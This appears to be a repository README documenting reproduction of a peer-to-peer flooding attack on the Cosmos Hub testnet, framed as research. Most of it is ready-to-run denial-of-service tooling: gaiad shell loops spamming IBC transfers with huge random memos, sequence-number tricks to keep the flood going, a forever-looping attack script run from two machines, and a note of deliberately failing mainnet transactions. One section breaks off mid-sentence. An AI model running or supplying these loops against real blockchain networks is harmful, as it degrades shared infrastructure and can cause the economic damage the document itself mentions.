# Spammy

## Tooling and documentation for the reproduction of:

* banana king
* client update spam
* banana client

In an effort to reporoduce a p2p storm on the cosmos hub testnet. 


### it has been reproduced

```log
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
```

these are from the hub testnet today, 9/27/2023



## Links to explorer

* **client updates**
 * https://ping.pub/cosmos/tx/2BA652123FFD549CCFA672BDD596801DABAD680029EA817369814DE5750DB4AB

* **testing wallet - mainnet**
  * https://www.mintscan.io/cosmos/address/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq
  * txns were made so that they fail intentionally.

* **testing wallet - testnet**
  * will vary between failed transactions and successes
  * goal is to increase block time on the testnet
  * https://explorer.rs-testnet.polypore.xyz/ 
  


## Target

We're looking to transmit a "banana client".  This transaction will 


## P2P storms have occured on the following networks:

* Sentinel
* Luna Classic
  * Led to economic harm 
* Stride


## Notes

Change the maximum request body size in config.toml

```toml
# Maximum size of request body, in bytes
max_body_bytes = 100000000
```

Generate a random string (hex output)

```bash
openssl rand -hex 10000000
```

Sign a transcation


Broadcast a transaction (oddly cli won't broadcast, we'll need to chain it)
```bash
gaiad tx broadcast bananasigned1.json --home ~/.gaia-rs
```

Abuse the ibc memo field
```bash
gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 10000) --chain-id provider --gas auto --yes
 ```

 Abuse the ibc memo field fast
 ```bash
 for (( ; ; )); do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 10000) --chain-id provider --gas auto --yes ; done
 ```

 Abuse the ibc memo field fast and avoid problems with the sequence number
 ```bash
 for i in {2000..3000}; do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i ; done
 ```

 Abuse the ibc memo field fast and avoid problems with the sequence number, wait a tenth of a second between runs
 ```bash
for i in {3045..5000}; do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i ; sleep .1 ; done
```

Abuse ibc memos using the account sequence to start


  Loop the loop script
```bash
while true ; do bash attack2.bash ; done
```

```bash
set -e

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')

for i in $( eval echo {"$SEQUENCE"..10000000} )
         do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
         done
```
but do it from two machines

```bash
set -e

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq | jq --raw-output ' .account.sequence ')

for i in $( eval echo {"$SEQUENCE"..10000000} )
         do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
         done
```






 Hub testnet blcok range 3881725 to 3881733



## How do I know if there is a p2p flood?

```log
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
7:05PM INF Peer ProposalBlockPartSetHeader mismatch, sleeping blockPartSetHeader={"hash":"15D4BC6DF45AB6A42002DE7F77C492D98BA9FC4D17C1A0FD8A544AA365D44489","total":1} height=3393430 module=consensus peer={"Data":{},"Logger":{}} peerBlockPartSetHeader={"hash":"AE74171AA9816668A59C8B0B5CE1CA337A49FA0420EAD47A29FA61D04162ACFD","total":336}
```

